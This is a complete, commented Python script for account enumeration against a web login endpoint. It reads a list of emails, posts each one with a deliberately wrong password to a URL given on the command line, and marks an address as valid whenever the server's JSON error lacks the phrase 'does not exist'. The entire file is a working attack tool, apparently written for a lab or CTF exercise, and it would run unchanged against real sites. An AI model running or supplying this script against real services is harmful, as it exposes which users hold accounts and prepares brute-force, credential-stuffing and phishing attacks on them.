import requests
import sys

# --------------------------------------------------
# Function: check_email
# --------------------------------------------------
# Sends a POST request to the login endpoint using
# a fixed password and a variable email (username).
#
# The goal is NOT to authenticate, but to analyze
# the error message returned by the server in order
# to determine whether the email exists.
# --------------------------------------------------
def check_email(email, url):
    # Minimal headers required for AJAX-based login endpoints
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
    }

    # Login data sent to the server
    # Password is intentionally incorrect
    data = {
        'username': email,
        'password': 'password',
        'function': 'login'
    }

    # Send POST request to the target login URL
    response = requests.post(url, headers=headers, data=data)

    # Attempt to parse JSON response
    # If the response is not JSON, return an empty dictionary
    try:
        return response.json()
    except ValueError:
        return {}


# --------------------------------------------------
# Function: enumerate_emails
# --------------------------------------------------
# Reads a list of emails from a file and checks each
# one against the login endpoint.
#
# Emails are classified as:
#   [INVALID] -> Email does not exist
#   [VALID]   -> Email exists but password is incorrect
# --------------------------------------------------
def enumerate_emails(email_file, url):
    valid_emails = []

    # Substring used to identify non-existing emails
    # Using a partial match makes the script more flexible
    invalid_error = "does not exist"

    # Open the email list file
    with open(email_file, 'r') as file:
        for email in file:
            email = email.strip()

            # Skip empty lines
            if not email:
                continue

            # Send request and analyze response
            response_json = check_email(email, url)

            status = response_json.get("status", "")
            message = response_json.get("message", "")

            # If the application explicitly says the email does not exist
            if status == "error" and invalid_error in message:
                print(f"[INVALID] {email}")
            else:
                # Any other response implies that the email exists
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails


# --------------------------------------------------
# Main execution logic
# --------------------------------------------------
if __name__ == "__main__":

    # Ensure correct number of command-line arguments
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <email_list_file> <login_url>")
        sys.exit(1)

    email_file = sys.argv[1]
    url = sys.argv[2]

    # Start enumeration process
    valid_emails = enumerate_emails(email_file, url)

    # Display final results
    print("\nValid emails found:")
    for email in valid_emails:
        print(email)
